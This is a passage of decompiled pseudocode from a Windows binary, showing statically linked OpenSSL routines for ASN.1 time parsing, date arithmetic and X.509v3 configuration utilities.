      sub_424880(v16, "NULL", 0x50u);
    sub_408610(2, "TYPE=", v16);
    return 0;
  }
}

//----- (0044BEC0) --------------------------------------------------------
BOOL __cdecl sub_44BEC0(int *a1, int *a2)
{
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  int v6; // edx
  char v7; // al
  char v8; // al
  int v9; // esi
  int v10; // eax
  char v11; // cl
  int v12; // eax
  char v13; // al
  int v14; // ecx
  char v15; // al
  int v16; // edi
  int v17; // ebp
  int v18; // edx
  char v19; // al
  char v20; // cl
  int v21; // esi
  int v22; // eax
  int v23; // eax
  int v24; // [esp+8h] [ebp+8h]

  if ( a2[1] != 24 )
    return 0;
  v3 = a2[2];
  v4 = *a2;
  v5 = 0;
  v24 = *a2;
  if ( v24 < 13 )
    return 0;
  v6 = 0;
  while ( 1 )
  {
    if ( v6 == 6 )
    {
      v7 = *(_BYTE *)(v5 + v3);
      if ( v7 == 90 || v7 == 43 || v7 == 45 )
        break;
    }
    v8 = *(_BYTE *)(v5 + v3);
    if ( v8 < 48 )
      return 0;
    if ( v8 > 57 )
      return 0;
    v9 = v5 + 1;
    v10 = v8 - 48;
    if ( v9 > v4 )
      return 0;
    v11 = *(_BYTE *)(v9 + v3);
    if ( v11 < 48 )
      return 0;
    if ( v11 > 57 )
      return 0;
    v5 = v9 + 1;
    v12 = v11 + 10 * v10 - 48;
    if ( v5 > v4 || v12 < dword_50DCE4[v6] || v12 > dword_50DD08[v6] )
      return 0;
    if ( a1 )
    {
      switch ( v6 )
      {
        case 0:
          a1[5] = 100 * (v12 - 19);
          break;
        case 1:
          a1[5] += v12;
          break;
        case 2:
          a1[4] = v12 - 1;
          break;
        case 3:
          a1[3] = v12;
          break;
        case 4:
          a1[2] = v12;
          break;
        case 5:
          a1[1] = v12;
          break;
        case 6:
          *a1 = v12;
          break;
        default:
          break;
      }
    }
    if ( ++v6 >= 7 )
      goto LABEL_30;
  }
  if ( a1 )
    *a1 = 0;
LABEL_30:
  if ( *(_BYTE *)(v5 + v3) == 46 )
  {
    if ( ++v5 > v4 )
      return 0;
    v13 = *(_BYTE *)(v5 + v3);
    v14 = v5;
    if ( v13 < 48 )
      return 0;
    do
    {
      if ( v13 > 57 )
        break;
      if ( v5 > v4 )
        break;
      v13 = *(_BYTE *)(v5 + v3 + 1);
      ++v5;
    }
    while ( v13 >= 48 );
    if ( v14 == v5 )
      return 0;
  }
  v15 = *(_BYTE *)(v5 + v3);
  if ( v15 == 90 )
    return v5 + 1 == v4;
  if ( v15 == 43 || v15 == 45 )
  {
    ++v5;
    v16 = 0;
    v17 = 2 * (v15 != 45) - 1;
    if ( v5 + 4 <= v24 )
    {
      v18 = 7;
      while ( 1 )
      {
        v19 = *(_BYTE *)(v5 + v3);
        if ( v19 < 48 )
          break;
        if ( v19 > 57 )
          break;
        v20 = *(_BYTE *)(v5 + v3 + 1);
        v21 = v5 + 1;
        v22 = v19 - 48;
        if ( v20 < 48 )
          break;
        if ( v20 > 57 )
          break;
        v23 = v20 + 10 * v22 - 48;
        if ( v23 < dword_50DCE4[v18] || v23 > dword_50DD08[v18] )
          break;
        if ( a1 )
        {
          if ( v18 == 7 )
          {
            v16 = 3600 * v23;
          }
          else if ( v18 == 8 )
          {
            v16 += 60 * v23;
          }
        }
        ++v18;
        v5 = v21 + 1;
        if ( v18 >= 9 )
        {
          if ( !v16 || sub_44CB90(a1, 0, v17 * v16) )
          {
            v4 = v24;
            return v5 == v4;
          }
          return 0;
        }
      }
    }
    return 0;
  }
  return !v15 && v5 == v4;
}
// 50DCE4: using guessed type int dword_50DCE4[9];
// 50DD08: using guessed type int dword_50DD08[9];

//----- (0044C110) --------------------------------------------------------
int __cdecl sub_44C110(int a1, const char *Src)
{
  signed int v2; // ebx
  int result; // eax
  int v4[4]; // [esp+8h] [ebp-10h] BYREF

  v4[1] = 24;
  v2 = strlen(Src);
  v4[0] = v2;
  v4[2] = (int)Src;
  if ( !sub_44BEC0(0, v4) )
    return 0;
  if ( a1 )
  {
    result = sub_432910(a1, Src, v2);
    if ( !result )
      return result;
    *(_DWORD *)(a1 + 4) = 24;
  }
  return 1;
}

//----- (0044C190) --------------------------------------------------------
_DWORD *__cdecl sub_44C190(_DWORD *a1, __time64_t Time, int a3, int a4)
{
  _DWORD *v4; // ebx
  struct tm *v6; // edi
  const char *v7; // esi
  struct tm v8; // [esp+8h] [ebp-24h] BYREF

  if ( a1 )
    v4 = a1;
  else
    v4 = sub_42C550();
  if ( !v4 )
    return 0;
  v6 = sub_44C950(&Time, &v8);
  if ( !v6 || (a3 || a4) && !sub_44CB90(&v6->tm_sec, a3, a4) )
    goto LABEL_14;
  v7 = (const char *)v4[2];
  if ( v7 && *v4 >= 0x14u )
  {
LABEL_18:
    sub_4191B0((int)v7, 20, "%04d%02d%02d%02d%02d%02dZ", v6->tm_year + 1900);
    *v4 = strlen(v7);
    v4[1] = 24;
    return v4;
  }
  v7 = (const char *)sub_4133F0(0x14u);
  if ( v7 )
  {
    sub_413490((void *)v4[2]);
    v4[2] = v7;
    goto LABEL_18;
  }
  sub_408310(13, 216, 65, (int)"crypto\\asn1\\a_gentm.c", 196);
LABEL_14:
  if ( !a1 )
    sub_42C4F0(v4);
  return 0;
}

//----- (0044C2C0) --------------------------------------------------------
BOOL __cdecl sub_44C2C0(int a1, int *a2)
{
  int v2; // edx
  char *v3; // eax
  int v4; // esi
  int v5; // edi
  char v6; // cl
  int v7; // esi
  int v8; // ebp
  char v9; // cl
  char v10; // bl
  _BYTE *v11; // eax
  _BYTE *v12; // ecx
  char *v13; // eax
  const char *v14; // eax
  const char *v16; // [esp+Ch] [ebp-18h]
  BOOL v17; // [esp+10h] [ebp-14h]
  int v18; // [esp+14h] [ebp-10h]
  int v19; // [esp+18h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-8h]
  int v21; // [esp+20h] [ebp-4h]
  int v22; // [esp+2Ch] [ebp+8h]

  v2 = *a2;
  v3 = (char *)a2[2];
  v4 = 0;
  v5 = 0;
  v18 = 0;
  v16 = 0;
  if ( *a2 >= 12 )
  {
    v17 = v3[v2 - 1] == 90;
    while ( 1 )
    {
      v6 = v3[v4];
      if ( v6 > 57 || v6 < 48 )
        break;
      if ( ++v4 >= 12 )
      {
        v7 = v3[5];
        v22 = v3[3] + 10 * (v3[2] + 10 * (v3[1] + 10 * *v3)) - 53328;
        v8 = v7 + 10 * v3[4] - 528;
        if ( (unsigned int)(v7 + 10 * v3[4] - 529) > 0xB )
          break;
        v21 = v3[7] + 10 * v3[6] - 528;
        v20 = v3[9] + 10 * v3[8] - 528;
        v19 = v3[11] + 10 * v3[10] - 528;
        if ( v2 >= 14 )
        {
          v9 = v3[12];
          if ( v9 >= 48 && v9 <= 57 )
          {
            v10 = v3[13];
            if ( v10 >= 48 && v10 <= 57 )
            {
              v18 = v10 + 10 * v9 - 528;
              if ( v2 >= 15 )
              {
                v11 = v3 + 14;
                if ( *v11 == 46 )
                {
                  v16 = v11;
                  v5 = 1;
                  if ( v2 > 15 )
                  {
                    v12 = v11;
                    v13 = v11 + 1;
                    do
                    {
                      if ( *v13 < 48 )
                        break;
                      if ( *v13 > 57 )
                        break;
                      ++v13;
                      ++v5;
                    }
                    while ( (int)&v13[14 - (_DWORD)v12] < v2 );
                  }
                }
              }
            }
          }
        }
        v14 = " GMT";
        if ( !v17 )
          v14 = byte_4F1291;
        return sub_419190(
                 a1,
                 "%s %2d %02d:%02d:%02d%.*s %d%s",
                 (const char *)dword_5316C8[v8],
                 v21,
                 v20,
                 v19,
                 v18,
                 v5,
                 v16,
                 v22,
                 v14) > 0;
      }
    }
  }
  sub_405110(a1, (int)"Bad time value", 14);
  return 0;
}
// 5316C8: using guessed type int dword_5316C8[];

//----- (0044C490) --------------------------------------------------------
BOOL __cdecl sub_44C490(int *a1, int *a2)
{
  int v3; // ebp
  int v4; // edi
  int v5; // esi
  int v6; // edx
  char v7; // al
  char v8; // al
  int v9; // esi
  int v10; // eax
  char v11; // cl
  int v12; // eax
  char v13; // al
  int v14; // edi
  int v15; // ebx
  int v16; // edx
  char v17; // al
  char v18; // cl
  int v19; // esi
  int v20; // eax
  int v21; // eax
  int v22; // [esp+8h] [ebp+8h]

  if ( a2[1] != 23 )
    return 0;
  v3 = a2[2];
  v4 = *a2;
  v5 = 0;
  v22 = *a2;
  if ( v22 < 11 )
    return 0;
  v6 = 0;
  while ( 1 )
  {
    if ( v6 == 5 )
    {
      v7 = *(_BYTE *)(v5 + v3);
      if ( v7 == 90 || v7 == 43 || v7 == 45 )
        break;
    }
    v8 = *(_BYTE *)(v5 + v3);
    if ( v8 < 48 )
      return 0;
    if ( v8 > 57 )
      return 0;
    v9 = v5 + 1;
    v10 = v8 - 48;
    if ( v9 > v4 )
      return 0;
    v11 = *(_BYTE *)(v9 + v3);
    if ( v11 < 48 )
      return 0;
    if ( v11 > 57 )
      return 0;
    v5 = v9 + 1;
    v12 = v11 + 10 * v10 - 48;
    if ( v5 > v4 || v12 < dword_50DD88[v6] || v12 > dword_50DDA8[v6] )
      return 0;
    if ( a1 )
    {
      switch ( v6 )
      {
        case 0:
          if ( v12 < 50 )
            v12 += 100;
          a1[5] = v12;
          break;
        case 1:
          a1[4] = v12 - 1;
          break;
        case 2:
          a1[3] = v12;
          break;
        case 3:
          a1[2] = v12;
          break;
        case 4:
          a1[1] = v12;
          break;
        case 5:
          *a1 = v12;
          break;
        default:
          break;
      }
    }
    if ( ++v6 >= 6 )
      goto LABEL_31;
  }
  if ( a1 )
    *a1 = 0;
LABEL_31:
  v13 = *(_BYTE *)(v5 + v3);
  if ( v13 == 90 )
    return v5 + 1 == v4;
  if ( v13 == 43 || v13 == 45 )
  {
    ++v5;
    v14 = 0;
    v15 = 2 * (v13 != 45) - 1;
    if ( v5 + 4 <= v22 )
    {
      v16 = 6;
      while ( 1 )
      {
        v17 = *(_BYTE *)(v5 + v3);
        if ( v17 < 48 )
          break;
        if ( v17 > 57 )
          break;
        v18 = *(_BYTE *)(v5 + v3 + 1);
        v19 = v5 + 1;
        v20 = v17 - 48;
        if ( v18 < 48 )
          break;
        if ( v18 > 57 )
          break;
        v21 = v18 + 10 * v20 - 48;
        if ( v21 < dword_50DD88[v16] || v21 > dword_50DDA8[v16] )
          break;
        if ( a1 )
        {
          if ( v16 == 6 )
          {
            v14 = 3600 * v21;
          }
          else if ( v16 == 7 )
          {
            v14 += 60 * v21;
          }
        }
        ++v16;
        v5 = v19 + 1;
        if ( v16 >= 8 )
        {
          if ( !v14 || sub_44CB90(a1, 0, v15 * v14) )
          {
            v4 = v22;
            return v5 == v4;
          }
          return 0;
        }
      }
    }
    return 0;
  }
  return v5 == v4;
}
// 50DD88: using guessed type int dword_50DD88[8];
// 50DDA8: using guessed type int dword_50DDA8[8];

//----- (0044C6A0) --------------------------------------------------------
_DWORD *__cdecl sub_44C6A0(_DWORD *Block, __time64_t Time, int a3, int a4)
{
  _DWORD *v4; // ebx
  int v5; // ebp
  struct tm *v6; // esi
  int tm_year; // eax
  const char *v8; // edi
  struct tm v10; // [esp+10h] [ebp-24h] BYREF

  v4 = Block;
  v5 = 0;
  if ( !Block )
  {
    v4 = sub_42C530();
    if ( !v4 )
      return 0;
    v5 = 1;
  }
  v6 = sub_44C950(&Time, &v10);
  if ( !v6 || (a3 || a4) && !sub_44CB90(&v6->tm_sec, a3, a4) || (tm_year = v6->tm_year, tm_year < 50) || tm_year >= 150 )
  {
LABEL_14:
    if ( v5 )
      sub_42C4F0(v4);
    return 0;
  }
  v8 = (const char *)v4[2];
  if ( !v8 || *v4 < 0x14u )
  {
    v8 = (const char *)sub_4133F0(0x14u);
    if ( !v8 )
    {
      sub_408310(13, 218, 65, (int)"crypto\\asn1\\a_utctm.c", 168);
      goto LABEL_14;
    }
    sub_413490((void *)v4[2]);
    v4[2] = v8;
  }
  sub_4191B0((int)v8, 20, "%02d%02d%02d%02d%02d%02dZ", v6->tm_year % 100);
  *v4 = strlen(v8);
  v4[1] = 23;
  return v4;
}

//----- (0044C950) --------------------------------------------------------
struct tm *__cdecl sub_44C950(__time64_t *Time, struct tm *a2)
{
  struct tm *result; // eax
  struct tm *v3; // esi

  result = _gmtime64(Time);
  if ( result )
  {
    v3 = result;
    result = a2;
    qmemcpy(a2, v3, sizeof(struct tm));
  }
  return result;
}

//----- (0044C980) --------------------------------------------------------
int __usercall sub_44C980@<eax>(int a1@<ecx>, int a2@<edi>, int a3)
{
  return 1461 * ((a1 - 14) / 12 + a2 + 4800) / 4
       + a3
       + 367 * (a1 - 12 * ((a1 - 14) / 12) - 2) / 12
       - 3 * (((a1 - 14) / 12 + a2 + 4900) / 100) / 4
       - 32075;
}

//----- (0044CA10) --------------------------------------------------------
_DWORD *__cdecl sub_44CA10(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // edi
  int v6; // ecx
  int v7; // ebx
  int v8; // ecx
  int v9; // esi
  _DWORD *result; // eax

  v4 = v3 + 68569;
  v5 = 4 * v4 / 146097;
  v6 = (146097 * v5 + 3) / -4 + v4;
  v7 = 4000 * (v6 + 1) / 1461001;
  v8 = 31 - 1461 * v7 / 4 + v6;
  v9 = 80 * v8 / 2447;
  *a3 = v8 - 2447 * v9 / 80;
  result = a1;
  *a2 = v9 - 12 * (v9 / 11) + 2;
  *a1 = v9 / 11 + v7 + 100 * (v5 - 49);
  return result;
}
// 44CA10: variable 'v3' is possibly undefined

//----- (0044CAF0) --------------------------------------------------------
int __fastcall sub_44CAF0(int a1, _DWORD *a2, int a3, int *a4, int *a5)
{
  int v5; // esi
  int v6; // ebx
  int v7; // eax

  v5 = a3 + a1 / 86400;
  v6 = *a2 + 60 * (a2[1] + 60 * a2[2]) + a1 % 86400;
  if ( v6 < 86400 )
  {
    if ( v6 < 0 )
    {
      --v5;
      v6 += 86400;
    }
  }
  else
  {
    ++v5;
    v6 -= 86400;
  }
  v7 = v5 + sub_44C980(a2[4] + 1, a2[5] + 1900, a2[3]);
  if ( v7 < 0 )
    return 0;
  *a4 = v7;
  *a5 = v6;
  return 1;
}

//----- (0044CB90) --------------------------------------------------------
int __cdecl sub_44CB90(int *a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // edx
  int v5; // eax
  int result; // eax
  int v7; // [esp+4h] [ebp-10h] BYREF
  int v8; // [esp+8h] [ebp-Ch] BYREF
  int v9; // [esp+Ch] [ebp-8h] BYREF
  int v10; // [esp+10h] [ebp-4h] BYREF

  if ( !sub_44CAF0(a3, a1, a2, &v7, &v10) )
    return 0;
  sub_44CA10(&v7, &v8, &v9);
  if ( (unsigned int)(v7 - 1900) > 0x1FA3 )
    return 0;
  v3 = v10;
  v4 = v8;
  a1[5] = v7 - 1900;
  v5 = v9;
  a1[4] = v4 - 1;
  a1[3] = v5;
  a1[2] = v3 / 3600;
  result = 1;
  a1[1] = v3 / 60 % 60;
  *a1 = v3 % 60;
  return result;
}

//----- (0044CC70) --------------------------------------------------------
int __cdecl sub_44CC70(int a1)
{
  int v2; // eax
  int v3; // eax
  int *v4; // [esp+0h] [ebp-3Ch] BYREF
  int v5[14]; // [esp+4h] [ebp-38h] BYREF

  v4 = v5;
  if ( a1 < 0 )
    return 0;
  v5[0] = a1;
  v2 = sub_423650((int)&v4, (int)off_531700, 46, 4, (int (__cdecl *)(int, int))sub_443940);
  if ( v2 )
    return *(_DWORD *)v2;
  if ( !dword_539280 )
    return 0;
  v3 = sub_426BE0(dword_539280, (int)v5);
  if ( v3 == -1 )
    return 0;
  return sub_426A40((int *)dword_539280, v3);
}
// 443940: using guessed type int sub_443940();
// 531700: using guessed type char *off_531700[2];
// 539280: using guessed type int dword_539280;

//----- (0044CCF0) --------------------------------------------------------
int __cdecl sub_44CCF0(int a1)
{
  int v1; // eax
  int result; // eax

  v1 = sub_445DB0(a1);
  result = sub_423680(v1);
  if ( result )
    return sub_44CC70(result);
  return result;
}

//----- (0044CD20) --------------------------------------------------------
int __cdecl sub_44CD20(int a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // edi
  int v5; // esi
  int v6; // esi
  int (*v7)(void); // eax
  int v8; // eax
  int v9; // [esp+8h] [ebp-4h] BYREF

  v1 = sub_445DB0(a1);
  v2 = sub_423680(v1);
  if ( !v2 )
    return 0;
  v3 = sub_44CC70(v2);
  if ( !v3 )
    return 0;
  v5 = sub_4319D0(a1);
  v9 = sub_432B60(v5);
  v6 = sub_435D30(v5);
  v7 = *(int (**)(void))(v3 + 8);
  if ( !v7 )
    return (*(int (__cdecl **)(_DWORD, int *, int))(v3 + 20))(0, &v9, v6);
  v8 = v7();
  return sub_42E9C0(0, (void **)&v9, v6, v8);
}

//----- (0044CDB0) --------------------------------------------------------
int __cdecl sub_44CDB0(int *a1, int a2, BOOL *a3, int *a4)
{
  int v4; // ebp
  int *v6; // edi
  int v7; // esi
  int v8; // edi
  int v9; // eax

  v4 = 0;
  if ( !a1 )
  {
    if ( a4 )
      *a4 = -1;
    if ( a3 )
      *a3 = -1;
    return 0;
  }
  v6 = a4;
  if ( !a4 || (v7 = *a4 + 1, v7 < 0) )
    v7 = 0;
  if ( v7 >= sub_426A30((int)a1) )
  {
LABEL_24:
    if ( v6 )
      *v6 = -1;
    if ( a3 )
      *a3 = -1;
    return 0;
  }
  while ( 1 )
  {
    v8 = sub_426A40(a1, v7);
    v9 = sub_445DB0(v8);
    if ( sub_423680(v9) == a2 )
      break;
LABEL_15:
    if ( ++v7 >= sub_426A30((int)a1) )
      goto LABEL_16;
  }
  if ( !a4 )
  {
    if ( v4 )
    {
      if ( !a3 )
        return 0;
      *a3 = -2;
      return 0;
    }
    v4 = v8;
    goto LABEL_15;
  }
  *a4 = v7;
  v4 = v8;
LABEL_16:
  if ( !v4 )
  {
    v6 = a4;
    goto LABEL_24;
  }
  if ( a3 )
    *a3 = sub_4319E0(v4);
  return sub_44CD20(v4);
}

//----- (0044CEA0) --------------------------------------------------------
int __cdecl sub_44CEA0(unsigned int **a1)
{
  return sub_431860(*a1);
}

//----- (0044CEB0) --------------------------------------------------------
int __cdecl sub_44CEB0(int a1)
{
  return *(_DWORD *)(a1 + 36);
}

//----- (0044CEC0) --------------------------------------------------------
int __cdecl sub_44CEC0(int a1)
{
  return *(_DWORD *)(a1 + 44);
}

//----- (0044CED0) --------------------------------------------------------
int __cdecl sub_44CED0(int a1)
{
  return *(_DWORD *)(a1 + 56);
}

//----- (0044CEE0) --------------------------------------------------------
_DWORD *__cdecl sub_44CEE0(int a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax

  if ( a2 )
    *a2 = *(_DWORD *)(a1 + 48);
  result = a3;
  if ( a3 )
    *a3 = *(_DWORD *)(a1 + 52);
  return result;
}

//----- (0044CF00) --------------------------------------------------------
int __cdecl sub_44CF00(int a1)
{
  return a1 + 20;
}

//----- (0044CF10) --------------------------------------------------------
int __cdecl sub_44CF10(const char *Src, const char *a2, int **a3)
{
  _DWORD *v3; // esi
  void *v4; // ebx
  void *v5; // edi
  int *v6; // eax

  v3 = 0;
  v4 = 0;
  v5 = 0;
  if ( (!Src || (v4 = sub_4247B0(Src)) != 0) && (!a2 || (v5 = sub_4247B0(a2)) != 0) )
  {
    v3 = sub_4133F0(0xCu);
    if ( v3 )
    {
      if ( *a3 || (v6 = sub_426AF0(), (*a3 = v6) != 0) )
      {
        *v3 = 0;
        v3[1] = v4;
        v3[2] = v5;
        if ( sub_4269B0(*a3, (int)v3) )
          return 1;
      }
    }
  }
  sub_408310(34, 105, 65, "crypto\\x509v3\\v3_utl.c", 56);
  sub_413490(v3);
  sub_413490(v4);
  sub_413490(v5);
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0044D000) --------------------------------------------------------
void __cdecl sub_44D000(void **Block)
{
  if ( Block )
  {
    sub_413490(Block[1]);
    sub_413490(Block[2]);
    sub_413490(*Block);
    sub_413490(Block);
  }
}

//----- (0044D050) --------------------------------------------------------
int __cdecl sub_44D050(const char *a1, void *a2, int **a3)
{
  if ( a2 )
    return sub_44CF10(a1, "TRUE", a3);
  else
    return sub_44CF10(a1, "FALSE", a3);
}

//----- (0044D080) --------------------------------------------------------
_BYTE *__cdecl sub_44D080(int a1, int a2)
{
  _BYTE *result; // eax
  _BYTE *v3; // edi
  void **v4; // eax
  void **v5; // esi

  result = (_BYTE *)a2;
  v3 = 0;
  if ( a2 )
  {
    v4 = (void **)sub_431960(a2, 0);
    v5 = v4;
    if ( !v4 || (v3 = sub_43A050(v4)) == 0 )
      sub_408310(34, 121, 65, (int)"crypto\\x509v3\\v3_utl.c", 106);
    sub_417060(v5);
    return v3;
  }
  return result;
}

//----- (0044D0E0) --------------------------------------------------------
_BYTE *__cdecl sub_44D0E0(int a1, int a2)
{
  _BYTE *result; // eax
  _BYTE *v3; // edi
  void **v4; // eax
  void **v5; // esi

  result = (_BYTE *)a2;
  v3 = 0;
  if ( a2 )
  {
    v4 = (void **)sub_4318D0(a2, 0);
    v5 = v4;
    if ( !v4 || (v3 = sub_43A050(v4)) == 0 )
      sub_408310(34, 120, 65, (int)"crypto\\x509v3\\v3_utl.c", 120);
    sub_417060(v5);
    return v3;
  }
  return result;
}

//----- (0044D140) --------------------------------------------------------
_DWORD *__cdecl sub_44D140(int a1, char *a2)
{
  char *v2; // esi
  int v4; // edi
  char v5; // al
  int v6; // eax
  _DWORD *v7; // esi
  void *Block; // [esp+4h] [ebp-4h] BYREF

  v2 = a2;
  Block = 0;
  if ( a2 )
  {
    Block = sub_4168C0();
    if ( Block )
    {
      if ( *a2 == 45 )
      {
        v2 = a2 + 1;
        v4 = 1;
      }
      else
      {
        v4 = 0;
      }
      if ( *v2 == 48 && ((v5 = v2[1], v5 == 120) || v5 == 88) )
      {
        v2 += 2;
        v6 = sub_43A270((void ***)&Block, v2);
      }
      else
      {
        v6 = sub_43A420((void ***)&Block, v2);
      }
      if ( !v6 || v2[v6] )
      {
        sub_417060((void **)Block);
        sub_408310(34, 108, 100, (int)"crypto\\x509v3\\v3_utl.c", 159);
        return 0;
      }
      else
      {
        if ( v4 && sub_416DB0((int)Block) )
          v4 = 0;
        v7 = sub_4318B0(Block, 0);
        sub_417060((void **)Block);
        if ( v7 )
        {
          if ( v4 )
            v7[1] |= 0x100u;
          return v7;
        }
        else
        {
          sub_408310(34, 108, 101, (int)"crypto\\x509v3\\v3_utl.c", 170);
          return 0;
        }
      }
    }
    else
    {
      sub_408310(34, 108, 65, (int)"crypto\\x509v3\\v3_utl.c", 137);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 108, 109, (int)"crypto\\x509v3\\v3_utl.c", 132);
    return 0;
  }
}

//----- (0044D280) --------------------------------------------------------
int __cdecl sub_44D280(const char *Src, int a2, int **a3)
{
  int result; // eax
  void *v4; // esi
  int v5; // edi

  if ( !a2 )
    return 1;
  result = (int)sub_44D0E0(0, a2);
  v4 = (void *)result;
  if ( result )
  {
    v5 = sub_44CF10(Src, (const char *)result, a3);
    sub_413490(v4);
    return v5;
  }
  return result;
}

//----- (0044D2D0) --------------------------------------------------------
int __cdecl sub_44D2D0(int a1, _DWORD *a2)
{
  if ( !*(_DWORD *)(a1 + 8) )
    goto LABEL_14;
  if ( !strcmp(*(const char **)(a1 + 8), "TRUE")
    || !strcmp(*(const char **)(a1 + 8), "true")
    || !strcmp(*(const char **)(a1 + 8), "Y")
    || !strcmp(*(const char **)(a1 + 8), "y")
    || !strcmp(*(const char **)(a1 + 8), "YES")
    || !strcmp(*(const char **)(a1 + 8), "yes") )
  {
    *a2 = 255;
    return 1;
  }
  else
  {
    if ( strcmp(*(const char **)(a1 + 8), "FALSE")
      && strcmp(*(const char **)(a1 + 8), "false")
      && strcmp(*(const char **)(a1 + 8), "N")
      && strcmp(*(const char **)(a1 + 8), "n")
      && strcmp(*(const char **)(a1 + 8), "NO")
      && strcmp(*(const char **)(a1 + 8), "no") )
    {
LABEL_14:
      sub_408310(34, 110, 104, "crypto\\x509v3\\v3_utl.c", 219);
      sub_408610(6, "section:", *(_DWORD *)a1, ",name:", *(_DWORD *)(a1 + 4), ",value:", *(_DWORD *)(a1 + 8));
      return 0;
    }
    *a2 = 0;
    return 1;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0044D5C0) --------------------------------------------------------
int __cdecl sub_44D5C0(int a1, _DWORD *a2)
{
  _DWORD *v2; // eax

  v2 = sub_44D140(0, *(char **)(a1 + 8));
  if ( v2 )
  {
    *a2 = v2;
    return 1;
  }
  else
  {
    sub_408610(6, "section:", *(_DWORD *)a1, ",name:", *(_DWORD *)(a1 + 4), ",value:", *(_DWORD *)(a1 + 8));
    return 0;
  }
}

//----- (0044D610) --------------------------------------------------------
const char *__fastcall sub_44D610(const char *a1)
{
  const char *v1; // esi
  const char *v3; // edi

  v1 = a1;
  if ( !*a1 )
    return 0;
  while ( isspace(*(unsigned __int8 *)v1) )
  {
    if ( !*++v1 )
      return 0;
  }
  if ( !*v1 )
    return 0;
  v3 = &v1[strlen(v1) - 1];
  if ( v3 != v1 )
  {
    while ( isspace(*(unsigned __int8 *)v3) )
    {
      if ( --v3 == v1 )
        return *v1 != 0 ? v1 : 0;
    }
    if ( v1 != v3 )
      *((_BYTE *)v3 + 1) = 0;
  }
  return *v1 != 0 ? v1 : 0;
}

//----- (0044D6A0) --------------------------------------------------------
int __cdecl sub_44D6A0(char *Str1, char *Str2)
{
  size_t v2; // esi
  int result; // eax
  char v4; // al

  v2 = strlen(Str2);
  result = strncmp(Str1, Str2, v2);
  if ( !result )
  {
    v4 = Str1[v2];
    return v4 && v4 != 46;
  }
  return result;
}

//----- (0044D6F0) --------------------------------------------------------
int __usercall sub_44D6F0@<eax>(_BYTE *a1@<esi>, char *Buffer)
{
  char v3; // dl
  char v4; // cl
  char v5; // al
  unsigned int v6; // [esp+0h] [ebp-10h] BYREF
  unsigned int v7; // [esp+4h] [ebp-Ch] BYREF
  unsigned int v8; // [esp+8h] [ebp-8h] BYREF
  unsigned int v9; // [esp+Ch] [ebp-4h] BYREF

  if ( sscanf(Buffer, "%d.%d.%d.%d", &v6, &v7, &v8, &v9) != 4 )
    return 0;
  if ( v6 > 0xFF )
    return 0;
  v3 = v7;
  if ( v7 > 0xFF )
    return 0;
  v4 = v8;
  if ( v8 > 0xFF )
    return 0;
  v5 = v9;
  if ( v9 > 0xFF )
    return 0;
  *a1 = v6;
  a1[3] = v5;
  a1[1] = v3;
  a1[2] = v4;
  return 1;
}

//----- (0044D780) --------------------------------------------------------
int __fastcall sub_44D780(int a1, char *a2, _BYTE *a3)
{
  int v3; // esi
  __int16 v4; // bx
  int v7; // eax
  char v8; // [esp+10h] [ebp-4h]

  v3 = a1;
  v4 = 0;
  if ( a1 > 4 )
    return 0;
  if ( a1 )
  {
    do
    {
      v8 = *a2;
      --v3;
      ++a2;
      v7 = sub_424920(v8);
      if ( v7 < 0 )
        return 0;
      v4 = (char)v7 | (unsigned __int16)(16 * v4);
    }
    while ( v3 );
  }
  *a3 = HIBYTE(v4);
  a3[1] = v4;
  return 1;
}

//----- (0044D7F0) --------------------------------------------------------
int __cdecl sub_44D7F0(int *a1, int *a2, int a3)
{
  int v4; // edi
  int v5; // eax
  char *v6; // esi
  char v7; // cl
  char *v8; // edx
  char *v9; // edx
  int v10; // ecx

  if ( !a1 )
    return 0;
  v4 = 0;
  if ( sub_426A30((int)a2) <= 0 )
    return 1;
  while ( 1 )
  {
    v5 = sub_426A40(a2, v4);
    v6 = *(char **)(v5 + 4);
    v7 = *v6;
    v8 = v6;
    if ( *v6 )
    {
      while ( v7 != 58 && v7 != 44 && v7 != 46 )
      {
        v7 = *++v8;
        if ( !v7 )
          goto LABEL_12;
      }
      v9 = v8 + 1;
      if ( *v9 )
        v6 = v9;
    }
LABEL_12:
    if ( *v6 == 43 )
    {
      v10 = -1;
      ++v6;
    }
    else
    {
      v10 = 0;
    }
    if ( !sub_44F2A0(a1, v6, a3, *(char **)(v5 + 8), -1, -1, v10) )
      return 0;
    if ( ++v4 >= sub_426A30((int)a2) )
      return 1;
  }
}

//----- (0044D8A0) --------------------------------------------------------
void *__cdecl sub_44D8A0(const char *Src)
{
  const char *v1; // ebx
  char *v2; // eax
  char *v3; // esi
  const char *v4; // edi
  char v5; // al
  int v6; // ebp
  const char *v7; // eax
  const char *v8; // eax
  const char *v9; // eax
  void *v11; // [esp+10h] [ebp-8h] BYREF
  void *Block; // [esp+14h] [ebp-4h]

  v1 = 0;
  v11 = 0;
  v2 = (char *)sub_4247B0(Src);
  Block = v2;
  if ( !v2 )
  {
    sub_408310(34, 109, 65, "crypto\\x509v3\\v3_utl.c", 253);
LABEL_26:
    sub_413490(Block);
    sub_426C00(v11, (void (__cdecl *)(_DWORD))sub_44D000);
    return 0;
  }
  v3 = v2;
  v4 = v2;
  v5 = *v2;
  v6 = 1;
  if ( v5 )
  {
    do
    {
      if ( v5 == 13 || v5 == 10 )
        break;
      if ( v6 == 1 )
      {
        if ( v5 == 58 )
        {
          v6 = 2;
          *v3 = 0;
          v1 = sub_44D610(v4);
          if ( !v1 )
          {
            sub_408310(34, 109, 108, "crypto\\x509v3\\v3_utl.c", 270);
            goto LABEL_26;
          }
          v4 = v3 + 1;
        }
        else if ( v5 == 44 )
        {
          *v3 = 0;
          v1 = sub_44D610(v4);
          v4 = v3 + 1;
          if ( !v1 )
          {
            sub_408310(34, 109, 108, "crypto\\x509v3\\v3_utl.c", 280);
            goto LABEL_26;
          }
          sub_44CF10(v1, 0, (int **)&v11);
        }
      }
      else if ( v5 == 44 )
      {
